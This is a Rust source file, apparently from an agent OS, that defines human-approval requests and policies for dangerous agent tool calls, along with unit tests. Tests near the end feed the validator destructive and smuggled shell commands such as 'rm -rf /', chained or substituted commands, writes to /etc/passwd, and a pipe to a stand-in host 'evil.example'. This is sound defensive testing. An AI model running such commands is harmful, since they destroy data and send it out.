//! Execution approval types for the OpenFang agent OS.
//!
//! When an agent attempts a dangerous operation (e.g. `shell_exec`), the kernel
//! creates an [`ApprovalRequest`] and pauses the agent until a human operator
//! responds with an [`ApprovalResponse`]. The [`ApprovalPolicy`] configures
//! which tools require approval and how long to wait before auto-denying.

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Maximum length of tool names (chars).
const MAX_TOOL_NAME_LEN: usize = 64;

/// Maximum length of a request description (chars).
const MAX_DESCRIPTION_LEN: usize = 1024;

/// Maximum length of an action summary (chars).
const MAX_ACTION_SUMMARY_LEN: usize = 512;

/// Minimum approval timeout in seconds.
const MIN_TIMEOUT_SECS: u64 = 10;

/// Maximum approval timeout in seconds.
const MAX_TIMEOUT_SECS: u64 = 300;

// ---------------------------------------------------------------------------
// RiskLevel
// ---------------------------------------------------------------------------

/// Risk level of an operation requiring approval.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskLevel {
    Low,
    Medium,
    High,
    Critical,
}

impl RiskLevel {
    /// Returns a warning emoji suitable for display in dashboards and chat.
    pub fn emoji(&self) -> &'static str {
        match self {
            RiskLevel::Low => "\u{2139}\u{fe0f}",      // information source
            RiskLevel::Medium => "\u{26a0}\u{fe0f}",   // warning sign
            RiskLevel::High => "\u{1f6a8}",            // rotating light
            RiskLevel::Critical => "\u{2620}\u{fe0f}", // skull and crossbones
        }
    }
}

// ---------------------------------------------------------------------------
// ApprovalDecision
// ---------------------------------------------------------------------------

/// Decision on an approval request.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ApprovalDecision {
    Approved,
    Denied,
    TimedOut,
}

// ---------------------------------------------------------------------------
// ApprovalRequest
// ---------------------------------------------------------------------------

/// An approval request for a dangerous agent operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalRequest {
    pub id: Uuid,
    pub agent_id: String,
    pub tool_name: String,
    pub description: String,
    /// The specific action being requested (sanitized for display).
    pub action_summary: String,
    pub risk_level: RiskLevel,
    pub requested_at: DateTime<Utc>,
    /// Auto-deny timeout in seconds.
    pub timeout_secs: u64,
}

impl ApprovalRequest {
    /// Validate this request's fields.
    ///
    /// Returns `Ok(())` or an error message describing the first validation failure.
    pub fn validate(&self) -> Result<(), String> {
        // -- tool_name --
        if self.tool_name.is_empty() {
            return Err("tool_name must not be empty".into());
        }
        if self.tool_name.len() > MAX_TOOL_NAME_LEN {
            return Err(format!(
                "tool_name too long ({} chars, max {MAX_TOOL_NAME_LEN})",
                self.tool_name.len()
            ));
        }
        if !self
            .tool_name
            .chars()
            .all(|c| c.is_alphanumeric() || c == '_')
        {
            return Err(
                "tool_name may only contain alphanumeric characters and underscores".into(),
            );
        }

        // -- description --
        if self.description.len() > MAX_DESCRIPTION_LEN {
            return Err(format!(
                "description too long ({} chars, max {MAX_DESCRIPTION_LEN})",
                self.description.len()
            ));
        }

        // -- action_summary --
        if self.action_summary.len() > MAX_ACTION_SUMMARY_LEN {
            return Err(format!(
                "action_summary too long ({} chars, max {MAX_ACTION_SUMMARY_LEN})",
                self.action_summary.len()
            ));
        }

        // -- timeout_secs --
        if self.timeout_secs < MIN_TIMEOUT_SECS {
            return Err(format!(
                "timeout_secs too small ({}, min {MIN_TIMEOUT_SECS})",
                self.timeout_secs
            ));
        }
        if self.timeout_secs > MAX_TIMEOUT_SECS {
            return Err(format!(
                "timeout_secs too large ({}, max {MAX_TIMEOUT_SECS})",
                self.timeout_secs
            ));
        }

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// ApprovalResponse
// ---------------------------------------------------------------------------

/// Response to an approval request.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalResponse {
    pub request_id: Uuid,
    pub decision: ApprovalDecision,
    pub decided_at: DateTime<Utc>,
    pub decided_by: Option<String>,
}

// ---------------------------------------------------------------------------
// ApprovalPolicy
// ---------------------------------------------------------------------------

/// Configurable approval policy.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct ApprovalPolicy {
    /// Tools that always require approval. Default: `["shell_exec"]`.
    ///
    /// Accepts either a list of tool names or a boolean shorthand:
    /// - `require_approval = false` → empty list (no tools require approval)
    /// - `require_approval = true`  → `["shell_exec"]` (the default set)
    #[serde(deserialize_with = "deserialize_require_approval")]
    pub require_approval: Vec<String>,
    /// Timeout in seconds. Default: 60, range: 10..=300.
    pub timeout_secs: u64,
    /// Auto-approve in autonomous mode. Default: `false`.
    pub auto_approve_autonomous: bool,
    /// Alias: if `auto_approve = true`, clears the require list at boot.
    #[serde(default, alias = "auto_approve")]
    pub auto_approve: bool,
    /// Shell commands that skip the human approval prompt. Default: empty.
    ///
    /// Intended for read-only health/diagnostic commands so scheduled agents
    /// (e.g. an ops monitor) can run without spamming approval prompts.
    ///
    /// Pattern forms (same glob semantics as per-agent capability `shell` lists):
    /// - `"uptime"` — exact match of the whole command
    /// - `"df *"` — first word match (`df -h`, `df /`, bare `df`)
    ///
    /// Safety: a command containing shell metacharacters (`;`, `&&`, `||`,
    /// `|`, `>`, `<`, `` ` ``, `$(`) never auto-approves — chained/piped
    /// commands fall through to the normal approval prompt, and the shell
    /// guard rejects chains anyway.
    pub auto_approve_shell: Vec<String>,
}

impl Default for ApprovalPolicy {
    fn default() -> Self {
        Self {
            require_approval: vec!["shell_exec".to_string()],
            timeout_secs: 60,
            auto_approve_autonomous: false,
            auto_approve: false,
            auto_approve_shell: Vec::new(),
        }
    }
}

impl ApprovalPolicy {
    /// True when `command` matches a configured `auto_approve_shell` pattern.
    ///
    /// See [`ApprovalPolicy::auto_approve_shell`] for pattern semantics and
    /// the metacharacter safety rule.
    pub fn shell_auto_approved(&self, command: &str) -> bool {
        if self.auto_approve_shell.is_empty() {
            return false;
        }
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return false;
        }
        // Never auto-approve anything with chaining/piping/redirection or
        // command substitution — only a single plain command qualifies.
        if trimmed.chars().any(|c| matches!(c, ';' | '&' | '|' | '>' | '<' | '`'))
            || trimmed.contains("$(")
        {
            return false;
        }
        let first_word = trimmed.split_whitespace().next().unwrap_or("");
        self.auto_approve_shell.iter().any(|pattern| {
            let pattern = pattern.trim();
            if let Some(prefix) = pattern.strip_suffix(" *") {
                !prefix.is_empty() && first_word == prefix
            } else if pattern == "*" {
                false // "everything" is too broad to auto-approve silently
            } else {
                trimmed == pattern
            }
        })
    }
}

/// Custom deserializer that accepts:
/// - A list of strings: `["shell_exec", "file_write"]`
/// - A boolean: `false` → `[]`, `true` → `["shell_exec"]`
fn deserialize_require_approval<'de, D>(deserializer: D) -> Result<Vec<String>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    use serde::de;

    struct RequireApprovalVisitor;

    impl<'de> de::Visitor<'de> for RequireApprovalVisitor {
        type Value = Vec<String>;

        fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
            f.write_str("a list of tool names or a boolean")
        }

        fn visit_bool<E: de::Error>(self, v: bool) -> Result<Self::Value, E> {
            Ok(if v {
                vec!["shell_exec".to_string()]
            } else {
                vec![]
            })
        }

        fn visit_seq<A: de::SeqAccess<'de>>(self, mut seq: A) -> Result<Self::Value, A::Error> {
            let mut v = Vec::new();
            while let Some(s) = seq.next_element::<String>()? {
                v.push(s);
            }
            Ok(v)
        }
    }

    deserializer.deserialize_any(RequireApprovalVisitor)
}

impl ApprovalPolicy {
    /// Apply the `auto_approve` shorthand: if true, clears the require list.
    pub fn apply_shorthands(&mut self) {
        if self.auto_approve {
            self.require_approval.clear();
        }
    }

    /// Validate this policy's fields.
    ///
    /// Returns `Ok(())` or an error message describing the first validation failure.
    pub fn validate(&self) -> Result<(), String> {
        // -- timeout_secs --
        if self.timeout_secs < MIN_TIMEOUT_SECS {
            return Err(format!(
                "timeout_secs too small ({}, min {MIN_TIMEOUT_SECS})",
                self.timeout_secs
            ));
        }
        if self.timeout_secs > MAX_TIMEOUT_SECS {
            return Err(format!(
                "timeout_secs too large ({}, max {MAX_TIMEOUT_SECS})",
                self.timeout_secs
            ));
        }

        // -- require_approval tool names --
        for (i, name) in self.require_approval.iter().enumerate() {
            if name.is_empty() {
                return Err(format!("require_approval[{i}] must not be empty"));
            }
            if name.len() > MAX_TOOL_NAME_LEN {
                return Err(format!(
                    "require_approval[{i}] too long ({} chars, max {MAX_TOOL_NAME_LEN})",
                    name.len()
                ));
            }
            if !name.chars().all(|c| c.is_alphanumeric() || c == '_') {
                return Err(format!(
                    "require_approval[{i}] may only contain alphanumeric characters and underscores: \"{name}\""
                ));
            }
        }

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // -- helpers --

    fn valid_request() -> ApprovalRequest {
        ApprovalRequest {
            id: Uuid::new_v4(),
            agent_id: "agent-001".into(),
            tool_name: "shell_exec".into(),
            description: "Execute rm -rf /tmp/stale_cache".into(),
            action_summary: "rm -rf /tmp/stale_cache".into(),
            risk_level: RiskLevel::High,
            requested_at: Utc::now(),
            timeout_secs: 60,
        }
    }

    fn valid_policy() -> ApprovalPolicy {
        ApprovalPolicy::default()
    }

    // -----------------------------------------------------------------------
    // RiskLevel
    // -----------------------------------------------------------------------

    #[test]
    fn risk_level_emoji() {
        assert_eq!(RiskLevel::Low.emoji(), "\u{2139}\u{fe0f}");
        assert_eq!(RiskLevel::Medium.emoji(), "\u{26a0}\u{fe0f}");
        assert_eq!(RiskLevel::High.emoji(), "\u{1f6a8}");
        assert_eq!(RiskLevel::Critical.emoji(), "\u{2620}\u{fe0f}");
    }

    #[test]
    fn risk_level_serde_roundtrip() {
        for level in [
            RiskLevel::Low,
            RiskLevel::Medium,
            RiskLevel::High,
            RiskLevel::Critical,
        ] {
            let json = serde_json::to_string(&level).unwrap();
            let back: RiskLevel = serde_json::from_str(&json).unwrap();
            assert_eq!(level, back);
        }
    }

    #[test]
    fn risk_level_rename_all() {
        let json = serde_json::to_string(&RiskLevel::Critical).unwrap();
        assert_eq!(json, "\"critical\"");
        let json = serde_json::to_string(&RiskLevel::Low).unwrap();
        assert_eq!(json, "\"low\"");
    }

    // -----------------------------------------------------------------------
    // ApprovalDecision
    // -----------------------------------------------------------------------

    #[test]
    fn decision_serde_roundtrip() {
        for decision in [
            ApprovalDecision::Approved,
            ApprovalDecision::Denied,
            ApprovalDecision::TimedOut,
        ] {
            let json = serde_json::to_string(&decision).unwrap();
            let back: ApprovalDecision = serde_json::from_str(&json).unwrap();
            assert_eq!(decision, back);
        }
    }

    #[test]
    fn decision_rename_all() {
        let json = serde_json::to_string(&ApprovalDecision::TimedOut).unwrap();
        assert_eq!(json, "\"timed_out\"");
    }

    // -----------------------------------------------------------------------
    // ApprovalRequest — valid
    // -----------------------------------------------------------------------

    #[test]
    fn valid_request_passes() {
        assert!(valid_request().validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalRequest — tool_name
    // -----------------------------------------------------------------------

    #[test]
    fn request_empty_tool_name() {
        let mut req = valid_request();
        req.tool_name = String::new();
        let err = req.validate().unwrap_err();
        assert!(err.contains("empty"), "{err}");
    }

    #[test]
    fn request_tool_name_too_long() {
        let mut req = valid_request();
        req.tool_name = "a".repeat(65);
        let err = req.validate().unwrap_err();
        assert!(err.contains("too long"), "{err}");
    }

    #[test]
    fn request_tool_name_64_chars_ok() {
        let mut req = valid_request();
        req.tool_name = "a".repeat(64);
        assert!(req.validate().is_ok());
    }

    #[test]
    fn request_tool_name_invalid_chars() {
        let mut req = valid_request();
        req.tool_name = "shell-exec".into();
        let err = req.validate().unwrap_err();
        assert!(err.contains("alphanumeric"), "{err}");
    }

    #[test]
    fn request_tool_name_with_underscore_ok() {
        let mut req = valid_request();
        req.tool_name = "file_write".into();
        assert!(req.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalRequest — description
    // -----------------------------------------------------------------------

    #[test]
    fn request_description_too_long() {
        let mut req = valid_request();
        req.description = "x".repeat(1025);
        let err = req.validate().unwrap_err();
        assert!(err.contains("description"), "{err}");
        assert!(err.contains("too long"), "{err}");
    }

    #[test]
    fn request_description_1024_ok() {
        let mut req = valid_request();
        req.description = "x".repeat(1024);
        assert!(req.validate().is_ok());
    }

    #[test]
    fn request_description_empty_ok() {
        let mut req = valid_request();
        req.description = String::new();
        assert!(req.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalRequest — action_summary
    // -----------------------------------------------------------------------

    #[test]
    fn request_action_summary_too_long() {
        let mut req = valid_request();
        req.action_summary = "x".repeat(513);
        let err = req.validate().unwrap_err();
        assert!(err.contains("action_summary"), "{err}");
        assert!(err.contains("too long"), "{err}");
    }

    #[test]
    fn request_action_summary_512_ok() {
        let mut req = valid_request();
        req.action_summary = "x".repeat(512);
        assert!(req.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalRequest — timeout_secs
    // -----------------------------------------------------------------------

    #[test]
    fn request_timeout_too_small() {
        let mut req = valid_request();
        req.timeout_secs = 9;
        let err = req.validate().unwrap_err();
        assert!(err.contains("too small"), "{err}");
    }

    #[test]
    fn request_timeout_too_large() {
        let mut req = valid_request();
        req.timeout_secs = 301;
        let err = req.validate().unwrap_err();
        assert!(err.contains("too large"), "{err}");
    }

    #[test]
    fn request_timeout_min_boundary_ok() {
        let mut req = valid_request();
        req.timeout_secs = 10;
        assert!(req.validate().is_ok());
    }

    #[test]
    fn request_timeout_max_boundary_ok() {
        let mut req = valid_request();
        req.timeout_secs = 300;
        assert!(req.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalResponse — serde
    // -----------------------------------------------------------------------

    #[test]
    fn response_serde_roundtrip() {
        let resp = ApprovalResponse {
            request_id: Uuid::new_v4(),
            decision: ApprovalDecision::Approved,
            decided_at: Utc::now(),
            decided_by: Some("admin@example.com".into()),
        };
        let json = serde_json::to_string(&resp).unwrap();
        let back: ApprovalResponse = serde_json::from_str(&json).unwrap();
        assert_eq!(back.request_id, resp.request_id);
        assert_eq!(back.decision, ApprovalDecision::Approved);
        assert_eq!(back.decided_by, Some("admin@example.com".into()));
    }

    #[test]
    fn response_decided_by_none() {
        let resp = ApprovalResponse {
            request_id: Uuid::new_v4(),
            decision: ApprovalDecision::TimedOut,
            decided_at: Utc::now(),
            decided_by: None,
        };
        let json = serde_json::to_string(&resp).unwrap();
        let back: ApprovalResponse = serde_json::from_str(&json).unwrap();
        assert_eq!(back.decided_by, None);
        assert_eq!(back.decision, ApprovalDecision::TimedOut);
    }

    // -----------------------------------------------------------------------
    // ApprovalPolicy — defaults
    // -----------------------------------------------------------------------

    #[test]
    fn policy_default_valid() {
        let policy = ApprovalPolicy::default();
        assert!(policy.validate().is_ok());
        assert_eq!(policy.require_approval, vec!["shell_exec".to_string()]);
        assert_eq!(policy.timeout_secs, 60);
        assert!(!policy.auto_approve_autonomous);
        assert!(!policy.auto_approve);
    }

    #[test]
    fn policy_serde_default() {
        // An empty JSON object should deserialize to defaults via #[serde(default)].
        let policy: ApprovalPolicy = serde_json::from_str("{}").unwrap();
        assert_eq!(policy.timeout_secs, 60);
        assert_eq!(policy.require_approval, vec!["shell_exec".to_string()]);
        assert!(!policy.auto_approve_autonomous);
    }

    #[test]
    fn policy_require_approval_bool_false() {
        // require_approval = false → empty list
        let policy: ApprovalPolicy =
            serde_json::from_str(r#"{"require_approval": false}"#).unwrap();
        assert!(policy.require_approval.is_empty());
    }

    #[test]
    fn policy_require_approval_bool_true() {
        // require_approval = true → ["shell_exec"]
        let policy: ApprovalPolicy = serde_json::from_str(r#"{"require_approval": true}"#).unwrap();
        assert_eq!(policy.require_approval, vec!["shell_exec"]);
    }

    #[test]
    fn policy_auto_approve_clears_list() {
        let mut policy = ApprovalPolicy::default();
        assert!(!policy.require_approval.is_empty());
        policy.auto_approve = true;
        policy.apply_shorthands();
        assert!(policy.require_approval.is_empty());
    }

    // -----------------------------------------------------------------------
    // ApprovalPolicy — timeout_secs
    // -----------------------------------------------------------------------

    #[test]
    fn policy_timeout_too_small() {
        let mut policy = valid_policy();
        policy.timeout_secs = 9;
        let err = policy.validate().unwrap_err();
        assert!(err.contains("too small"), "{err}");
    }

    #[test]
    fn policy_timeout_too_large() {
        let mut policy = valid_policy();
        policy.timeout_secs = 301;
        let err = policy.validate().unwrap_err();
        assert!(err.contains("too large"), "{err}");
    }

    #[test]
    fn policy_timeout_boundaries_ok() {
        let mut policy = valid_policy();
        policy.timeout_secs = 10;
        assert!(policy.validate().is_ok());
        policy.timeout_secs = 300;
        assert!(policy.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // ApprovalPolicy — require_approval tool names
    // -----------------------------------------------------------------------

    #[test]
    fn policy_empty_tool_name() {
        let mut policy = valid_policy();
        policy.require_approval = vec!["shell_exec".into(), "".into()];
        let err = policy.validate().unwrap_err();
        assert!(err.contains("require_approval[1]"), "{err}");
        assert!(err.contains("empty"), "{err}");
    }

    #[test]
    fn policy_tool_name_too_long() {
        let mut policy = valid_policy();
        policy.require_approval = vec!["a".repeat(65)];
        let err = policy.validate().unwrap_err();
        assert!(err.contains("too long"), "{err}");
    }

    #[test]
    fn policy_tool_name_invalid_chars() {
        let mut policy = valid_policy();
        policy.require_approval = vec!["shell-exec".into()];
        let err = policy.validate().unwrap_err();
        assert!(err.contains("alphanumeric"), "{err}");
    }

    #[test]
    fn policy_tool_name_with_spaces_rejected() {
        let mut policy = valid_policy();
        policy.require_approval = vec!["shell exec".into()];
        let err = policy.validate().unwrap_err();
        assert!(err.contains("alphanumeric"), "{err}");
    }

    #[test]
    fn policy_multiple_valid_tools() {
        let mut policy = valid_policy();
        policy.require_approval = vec![
            "shell_exec".into(),
            "file_write".into(),
            "file_delete".into(),
        ];
        assert!(policy.validate().is_ok());
    }

    #[test]
    fn policy_empty_require_approval_ok() {
        let mut policy = valid_policy();
        policy.require_approval = vec![];
        assert!(policy.validate().is_ok());
    }

    // -----------------------------------------------------------------------
    // Full serde roundtrip — ApprovalRequest
    // -----------------------------------------------------------------------

    #[test]
    fn request_serde_roundtrip() {
        let req = valid_request();
        let json = serde_json::to_string_pretty(&req).unwrap();
        let back: ApprovalRequest = serde_json::from_str(&json).unwrap();
        assert_eq!(back.id, req.id);
        assert_eq!(back.agent_id, req.agent_id);
        assert_eq!(back.tool_name, req.tool_name);
        assert_eq!(back.description, req.description);
        assert_eq!(back.action_summary, req.action_summary);
        assert_eq!(back.risk_level, req.risk_level);
        assert_eq!(back.timeout_secs, req.timeout_secs);
    }

    // -----------------------------------------------------------------------
    // Full serde roundtrip — ApprovalPolicy
    // -----------------------------------------------------------------------

    #[test]
    fn policy_serde_roundtrip() {
        let policy = ApprovalPolicy {
            require_approval: vec!["shell_exec".into(), "file_delete".into()],
            timeout_secs: 120,
            auto_approve_autonomous: true,
            auto_approve: false,
            auto_approve_shell: vec![],
        };
        let json = serde_json::to_string(&policy).unwrap();
        let back: ApprovalPolicy = serde_json::from_str(&json).unwrap();
        assert_eq!(back.require_approval, policy.require_approval);
        assert_eq!(back.timeout_secs, 120);
        assert!(back.auto_approve_autonomous);
    }

    // -- auto_approve_shell pattern matching --

    fn readonly_policy() -> ApprovalPolicy {
        ApprovalPolicy {
            auto_approve_shell: vec![
                "uptime".into(),
                "df *".into(),
                "free *".into(),
                "ps *".into(),
            ],
            ..Default::default()
        }
    }

    #[test]
    fn test_shell_auto_approved_exact_and_prefix_patterns() {
        let p = readonly_policy();
        // Exact pattern: whole command must match.
        assert!(p.shell_auto_approved("uptime"));
        assert!(!p.shell_auto_approved("uptime -p")); // not exact
        // Prefix pattern: first word match, with or without args.
        assert!(p.shell_auto_approved("df -h /"));
        assert!(p.shell_auto_approved("df"));
        assert!(p.shell_auto_approved("  free -m  ")); // trimmed
        assert!(p.shell_auto_approved("ps aux"));
        // Unlisted commands never match.
        assert!(!p.shell_auto_approved("rm -rf /"));
        assert!(!p.shell_auto_approved("reboot"));
        assert!(!p.shell_auto_approved(""));
    }

    #[test]
    fn test_shell_auto_approved_rejects_chained_commands() {
        let p = readonly_policy();
        // Metacharacter smuggling must fall through to the human prompt even
        // when the first command is allowlisted.
        assert!(!p.shell_auto_approved("uptime && free -m"));
        assert!(!p.shell_auto_approved("df -h; rm -rf /"));
        assert!(!p.shell_auto_approved("free -m | curl evil.example"));
        assert!(!p.shell_auto_approved("uptime > /etc/passwd"));
        assert!(!p.shell_auto_approved("ps $(rm -rf /)"));
        assert!(!p.shell_auto_approved("df -h `reboot`"));
    }

    #[test]
    fn test_shell_auto_approved_default_policy_is_empty() {
        let p = ApprovalPolicy::default();
        assert!(p.auto_approve_shell.is_empty());
        assert!(!p.shell_auto_approved("uptime"));
        // Bare "*" is never a valid auto-approve pattern.
        let p = ApprovalPolicy {
            auto_approve_shell: vec!["*".into()],
            ..Default::default()
        };
        assert!(!p.shell_auto_approved("rm -rf /"));
    }
}
